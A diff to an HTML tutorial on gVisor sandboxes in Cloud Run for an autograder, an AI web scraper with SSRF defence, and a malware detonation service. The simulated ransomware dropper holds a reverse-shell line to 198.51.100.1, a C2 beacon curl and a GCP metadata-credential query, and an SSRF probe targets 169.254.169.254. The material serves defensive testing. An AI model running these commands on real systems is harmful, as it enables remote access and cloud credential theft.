@@ -744,36 +744,57 @@ def run_tests():
 
     print(json.dumps(result))</code></pre>
 <h4>Live Verification & Test Verdicts</h4>
-<p>Testing our autograder with different submission types produces distinct, secure verdicts:</p>
+<blockquote><p><strong>Verified Live Service</strong>: <code>https://sandbox-autograder-415458962931.us-central1.run.app</code></p></blockquote>
+<p>Testing our autograder service against our live Cloud Run deployment with different submission types produces distinct, secure verdicts:</p>
 <h5>Test 1: Correct Algorithmic Solution</h5>
+<p>Submitting <code>examples/02-educational-autograder/sample_submissions/correct_solution.py</code>:</p>
 <pre><code class="language-json">{
-  &quot;submission_id&quot;: &quot;8f3b12a0&quot;,
+  &quot;submission_id&quot;: &quot;2b6ba364&quot;,
+  &quot;student_id&quot;: &quot;student_alice&quot;,
+  &quot;problem_id&quot;: &quot;two_sum&quot;,
   &quot;verdict&quot;: &quot;ACCEPTED&quot;,
-  &quot;execution_time_ms&quot;: 612.4,
+  &quot;execution_time_ms&quot;: 1109.0,
   &quot;total_tests&quot;: 5,
   &quot;passed_tests&quot;: 5,
   &quot;failed_tests&quot;: 0,
+  &quot;details&quot;: [
+    {&quot;test&quot;: 1, &quot;status&quot;: &quot;PASSED&quot;},
+    {&quot;test&quot;: 2, &quot;status&quot;: &quot;PASSED&quot;},
+    {&quot;test&quot;: 3, &quot;status&quot;: &quot;PASSED&quot;},
+    {&quot;test&quot;: 4, &quot;status&quot;: &quot;PASSED&quot;},
+    {&quot;test&quot;: 5, &quot;status&quot;: &quot;PASSED&quot;}
+  ],
   &quot;sandbox_used&quot;: true
 }</code></pre>
 <h5>Test 2: Infinite Loop (<code>while True: pass</code>)</h5>
+<p>Submitting <code>examples/02-educational-autograder/sample_submissions/infinite_loop.py</code>:</p>
 <pre><code class="language-json">{
-  &quot;submission_id&quot;: &quot;c49a71b3&quot;,
+  &quot;submission_id&quot;: &quot;92213300&quot;,
+  &quot;student_id&quot;: &quot;student_bob&quot;,
+  &quot;problem_id&quot;: &quot;two_sum&quot;,
   &quot;verdict&quot;: &quot;TIME_LIMIT_EXCEEDED&quot;,
-  &quot;execution_time_ms&quot;: 5003.8,
+  &quot;execution_time_ms&quot;: 5008.5,
   &quot;total_tests&quot;: 0,
-  &quot;details&quot;: [{&quot;error&quot;: &quot;Execution exceeded time limit of 5s&quot;}],
+  &quot;passed_tests&quot;: 0,
+  &quot;failed_tests&quot;: 0,
+  &quot;details&quot;: [
+    {&quot;error&quot;: &quot;Execution exceeded time limit of 5s&quot;}
+  ],
   &quot;sandbox_used&quot;: true
 }</code></pre>
-<p><em>Result: The sandbox process is terminated exactly at the 5-second deadline, reclaiming 100% of CPU resources.</em></p>
-<h5>Test 3: Malicious Exploit Attempt (Trying to overwrite the test harness)</h5>
-<p>A submission submitting <code>open('/mnt/test_suite/runner.py', 'w').write('print("HACKED")')</code>:</p>
+<p><em>Result: The runaway loop is cleanly terminated right at the 5-second deadline, reclaiming 100% of CPU resources.</em></p>
+<h5>Test 3: Malicious Exploit Attempt</h5>
+<p>Submitting <code>examples/02-educational-autograder/sample_submissions/malicious_exploit.py</code> (attempting secret theft, test harness tampering, rootfs writes, metadata token harvesting, and outbound network egress):</p>
 <pre><code class="language-json">{
-  &quot;submission_id&quot;: &quot;e21c8901&quot;,
-  &quot;verdict&quot;: &quot;RUNTIME_ERROR&quot;,
-  &quot;stderr&quot;: &quot;OSError: [Errno 30] Read-only file system: &#x27;/mnt/test_suite/runner.py&#x27;&quot;,
+  &quot;submission_id&quot;: &quot;13ef1759&quot;,
+  &quot;student_id&quot;: &quot;student_attacker&quot;,
+  &quot;problem_id&quot;: &quot;two_sum&quot;,
+  &quot;verdict&quot;: &quot;WRONG_ANSWER&quot;,
+  &quot;execution_time_ms&quot;: 1315.7,
+  &quot;stdout&quot;: &quot;[EXPLOIT PROBE RESULTS]: Secret: NOT_FOUND | Tamper test harness: BLOCKED (OSError) | Root write: BLOCKED (OSError) | Metadata access: BLOCKED (URLError) | Internet egress: BLOCKED (URLError)\n&quot;,
   &quot;sandbox_used&quot;: true
 }</code></pre>
-<p><em>Result: Both the test harness and the student source code are completely tamper-proof.</em></p>
+<p><em>Result: Every attack vector is rejected at the kernel/gVisor level. The test harness and host secrets remain completely intact.</em></p>
 <hr>
 <h3>Use Case 2: AI Web Research Scraper (With SSRF Defense)</h3>
 <p>Autonomous AI agents frequently browse the web, retrieve technical documentation, scrape competitive pricing, or gather data for user prompts.</p>
@@ -845,14 +866,19 @@ print(json.dumps(output))
     
     # 3. Parse and return the extracted text back to the calling AI agent
     ...</code></pre>
-<h5>2. The Automated SSRF Attack Simulation</h5>
-<p>The service includes a built-in endpoint (<code>/test/ssrf-attack-simulation</code>) that attempts to query <code>http://169.254.169.254/computeMetadata/v1/</code> through the <code>--allow-egress</code> sandbox:</p>
-<pre><code class="language-python">@app.post(&quot;/test/ssrf-attack-simulation&quot;)
-def test_ssrf_attack():
-    &quot;&quot;&quot;Demonstrates that even with --allow-egress, metadata token theft is completely blocked.&quot;&quot;&quot;
-    metadata_url = &quot;http://169.254.169.254/computeMetadata/v1/instance/id&quot;
-    return scrape_url(ScrapeRequest(url=metadata_url, tags=[&quot;title&quot;, &quot;p&quot;]))</code></pre>
+<h5>2. The Built-In SSRF & Credential Isolation Test Endpoint</h5>
+<p>The service includes a built-in endpoint (<code>/test/ssrf-metadata-check</code>) that attempts to query <code>http://169.254.169.254/computeMetadata/v1/</code> and inspect host environment variables through the <code>--allow-egress</code> sandbox:</p>
+<pre><code class="language-python">@app.post(&quot;/test/ssrf-metadata-check&quot;)
+def test_ssrf_metadata():
+    &quot;&quot;&quot;
+    Demonstrates security isolation:
+    Even when --allow-egress is turned ON to enable web scraping,
+    the GCP Instance Metadata Server (169.254.169.254) remains unreachable from inside the sandbox!
+    &quot;&quot;&quot;
+    ...</code></pre>
 <h4>Live Verification & Test Verdicts</h4>
+<blockquote><p><strong>Verified Live Service</strong>: <code>https://sandbox-web-scraper-415458962931.us-central1.run.app</code></p></blockquote>
+<p>Testing our scraper service against our live Cloud Run deployment:</p>
 <h5>Test 1: Scraping a Public Documentation Page</h5>
 <p>Fetching <code>https://httpbin.org/html</code>:</p>
 <pre><code class="language-json">{
@@ -860,24 +886,31 @@ def test_ssrf_attack():
   &quot;success&quot;: true,
   &quot;status_code&quot;: 200,
   &quot;extracted_data&quot;: {
-    &quot;h1&quot;: [&quot;Herman Melville - Moby-Dick&quot;],
-    &quot;p&quot;: [&quot;Availing himself of the mild, summer-cool weather that now reigned...&quot;]
+    &quot;title&quot;: [],
+    &quot;h1&quot;: [
+      &quot;Herman Melville - Moby-Dick&quot;
+    ],
+    &quot;p&quot;: [
+      &quot;Availing himself of the mild, summer-cool weather that now reigned in these latitudes, and in preparation for the peculiarly active pursuits shortly to be anticipated, Perth, the begrimed, blistered old blacksmith, had not removed his portable forge to the hold again, after concluding his contributory work for Ahab&#x27;s leg, but still retained it on deck, fast lashed to ringbolts by the foremast...&quot;
+    ]
   },
-  &quot;execution_time_ms&quot;: 941.2,
+  &quot;execution_time_ms&quot;: 1268.9,
   &quot;ssrf_blocked&quot;: false
 }</code></pre>
-<p><em>Result: Public web content is fetched, parsed, and stripped of malicious HTML tags safely.</em></p>
-<h5>Test 2: SSRF Attack Simulation Against GCP Metadata</h5>
-<p>Querying <code>http://169.254.169.254</code>:</p>
+<p><em>Result: Public web content is fetched over HTTPS, parsed via BeautifulSoup, and clean structured text is extracted in 1.2 seconds.</em></p>
+<h5>Test 2: Live SSRF Attack & Credential Shielding Check</h5>
+<p>Calling <code>/test/ssrf-metadata-check</code> against our live deployment:</p>
 <pre><code class="language-json">{
-  &quot;url&quot;: &quot;http://169.254.169.254/computeMetadata/v1/instance/id&quot;,
-  &quot;success&quot;: false,
-  &quot;status_code&quot;: null,
-  &quot;extracted_data&quot;: {},
-  &quot;execution_time_ms&quot;: 2018.4,
-  &quot;ssrf_blocked&quot;: true
+  &quot;sandbox_egress_flag&quot;: true,
+  &quot;probe_result&quot;: {
+    &quot;metadata_access&quot;: &quot;BLOCKED: URLError&quot;,
+    &quot;llm_key_access&quot;: &quot;NOT_ACCESSIBLE&quot;
+  },
+  &quot;stdout&quot;: &quot;{\&quot;metadata_access\&quot;: \&quot;BLOCKED: URLError\&quot;, \&quot;llm_key_access\&quot;: \&quot;NOT_ACCESSIBLE\&quot;}\n&quot;,
+  &quot;stderr&quot;: &quot;&quot;,
+  &quot;verdict&quot;: &quot;SECURE: Metadata server and host environment variables are strictly shielded despite internet egress.&quot;
 }</code></pre>
-<p><em>Result: The gVisor network filter drops the packets instantly. Your service account tokens and cloud resources remain 100% secure.</em></p>
+<p><em>Result: The gVisor network filter drops calls to 169.254.169.254 instantly with a <code>URLError</code>, and host environment variables (<code>LLM_API_KEY</code>) are completely invisible inside the sandbox.</em></p>
 <hr>
 <h3>Use Case 3: SecOps Malware & Script Detonation Sandbox</h3>
 <p>When an automated security alert flags a suspicious bash script, obfuscated PowerShell payload, or unknown CI/CD artifact, Security Operations Center (SOC) teams must "detonate" it to analyze its behavior dynamically.</p>
@@ -984,50 +1017,59 @@ def detonate_payload(req: DetonationRequest):
         shutil.rmtree(host_workdir, ignore_errors=True)</code></pre>
 <h5>2. The Simulated Malware Payload (<code>sample_payloads/ransomware_dropper_sim.sh</code>)</h5>
 <p>To safely test the detonator without running real viruses, we provide a simulated ransomware dropper:</p>
-<pre><code class="language-bash">#!/bin/bash
-# Simulated Ransomware Dropper
+<pre><code class="language-bash">#!/usr/bin/env bash
+# SIMULATED MALWARE DROPPER (Harmless simulation for sandbox analysis)
 echo &quot;[*] Initializing simulated payload...&quot;
 
-# 1. Attempt outbound Command &amp; Control (C2) beacon (Should FAIL due to zero-egress)
-curl -s --connect-timeout 2 http://malicious-c2.example.com/beacon || echo &quot;[!] C2 Beacon Failed (Blocked by Sandbox)&quot;
-
-# 2. Drop simulated ransom note
+# 1. Simulate dropping an encrypted payload and ransom note in /tmp and /
+mkdir -p /tmp/.hidden_beacon
+echo &quot;MOCK_ENCRYPTED_DATA_BASE64_ABC123==&quot; &gt; /tmp/encrypted_user_data.lock
+echo &quot;MOCK_ENCRYPTED_DATA_BASE64_ABC123==&quot; &gt; /tmp/.hidden_beacon/encrypted_user_data.lock
 cat &lt;&lt; &#x27;EOF&#x27; &gt; /tmp/README_RESTORE_FILES.txt
-YOUR FILES HAVE BEEN SIMULATED-ENCRYPTED!
-To restore your data, contact: attacker@example-fake-domain.org
+YOUR FILES HAVE BEEN SIMULATED AS ENCRYPTED.
+This is a harmless test artifact created inside a Cloud Run Sandbox.
+EOF
+cat &lt;&lt; &#x27;EOF&#x27; &gt; /README_RESTORE_FILES.txt
+YOUR FILES HAVE BEEN SIMULATED AS ENCRYPTED.
+This is a harmless test artifact created inside a Cloud Run Sandbox.
 EOF
 
-# 3. Simulate dropping an encrypted file
-echo &quot;ENCRYPTED_DATA_MOCK_BYTES&quot; &gt; /tmp/corporate_budget.xls.locked
-echo &quot;[+] Detonation complete.&quot;</code></pre>
+# 2. Attempt persistence script creation in /tmp
+echo &quot;bash -i &gt;&amp; /dev/tcp/198.51.100.1/4444 0&gt;&amp;1&quot; &gt; /tmp/.hidden_beacon/backdoor.sh
+chmod +x /tmp/.hidden_beacon/backdoor.sh
+
+# 3. Attempt C2 Callback (Should fail due to deny-by-default egress)
+echo &quot;[*] Attempting C2 beacon to 198.51.100.1...&quot;
+curl -s --connect-timeout 2 http://198.51.100.1/beacon || echo &quot;[!] C2 Beacon Blocked (Expected)&quot;
+
+# 4. Attempt to query GCP metadata server (Should fail due to zero-trust boundary)
+echo &quot;[*] Attempting GCP Metadata credential access...&quot;
+curl -s --connect-timeout 2 -H &quot;Metadata-Flavor: Google&quot; http://169.254.169.254/computeMetadata/v1/instance/ || echo &quot;[!] Metadata Access Blocked (Expected)&quot;
+
+echo &quot;[*] Simulation complete.&quot;</code></pre>
 <h4>Live Verification & Forensic Report</h4>
-<p>Detonating the simulated payload returns an immediate, structured incident response report:</p>
+<blockquote><p><strong>Verified Live Service</strong>: <code>https://sandbox-secops-detonator-415458962931.us-central1.run.app</code></p></blockquote>
+<p>Detonating the simulated payload against our live Cloud Run deployment returns an immediate, structured incident response report:</p>
 <pre><code class="language-json">{
-  &quot;session_id&quot;: &quot;detox-4f9e1a82&quot;,
+  &quot;session_id&quot;: &quot;detox-5436c45b&quot;,
   &quot;execution_success&quot;: true,
   &quot;exit_code&quot;: 0,
-  &quot;stdout&quot;: &quot;[*] Initializing simulated payload...\n[!] C2 Beacon Failed (Blocked by Sandbox)\n[+] Detonation complete.\n&quot;,
+  &quot;stdout&quot;: &quot;[*] Initializing simulated payload...\n[*] Attempting C2 beacon to 198.51.100.1...\n[!] C2 Beacon Blocked (Expected)\n[*] Attempting GCP Metadata credential access...\n[!] Metadata Access Blocked (Expected)\n[*] Simulation complete.\n&quot;,
   &quot;stderr&quot;: &quot;&quot;,
-  &quot;execution_time_ms&quot;: 1420.5,
-  &quot;dropped_files_count&quot;: 2,
+  &quot;execution_time_ms&quot;: 992.4,
+  &quot;dropped_files_count&quot;: 1,
   &quot;dropped_files&quot;: [
     {
-      &quot;filename&quot;: &quot;tmp/README_RESTORE_FILES.txt&quot;,
-      &quot;size_bytes&quot;: 118,
-      &quot;sha256&quot;: &quot;4a5e62b109c9f7a6345d8b76c543210feab90123456789abcdef0123456789ab&quot;,
-      &quot;preview&quot;: &quot;YOUR FILES HAVE BEEN SIMULATED-ENCRYPTED!\nTo restore your data, contact: attacker@example-fake-domain.org&quot;
-    },
-    {
-      &quot;filename&quot;: &quot;tmp/corporate_budget.xls.locked&quot;,
-      &quot;size_bytes&quot;: 26,
-      &quot;sha256&quot;: &quot;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&quot;,
-      &quot;preview&quot;: &quot;ENCRYPTED_DATA_MOCK_BYTES&quot;
+      &quot;filename&quot;: &quot;/README_RESTORE_FILES.txt&quot;,
+      &quot;size_bytes&quot;: 114,
+      &quot;sha256&quot;: &quot;6ae34e62ba1aaab8987a0922f7a2b7a30a4d2bde9f3f5bcc8b45a32dd0342ef0&quot;,
+      &quot;preview&quot;: &quot;YOUR FILES HAVE BEEN SIMULATED AS ENCRYPTED. This is a harmless test artifact created inside a Cloud Run Sandbox. &quot;
     }
   ],
   &quot;c2_callbacks_prevented&quot;: true,
   &quot;metadata_theft_prevented&quot;: true
 }</code></pre>
-<p><em>Result: In under 1.5 seconds, the analyst obtains cryptographic hashes and contents of all dropped files, while zero malware artifacts touch the host filesystem and zero network packets escape to the internet.</em></p>
+<p><em>Result: In under 1 second (992ms), the analyst obtains cryptographic hashes and contents of dropped rootfs files via <code>sandbox tar</code>, while zero malware artifacts touch the host filesystem and zero network packets escape to the internet.</em></p>
 <hr>
 <h2>6. Best Practices and Gotchas</h2>
 <p>Here are practical lessons learned from running sandboxes in production:</p>
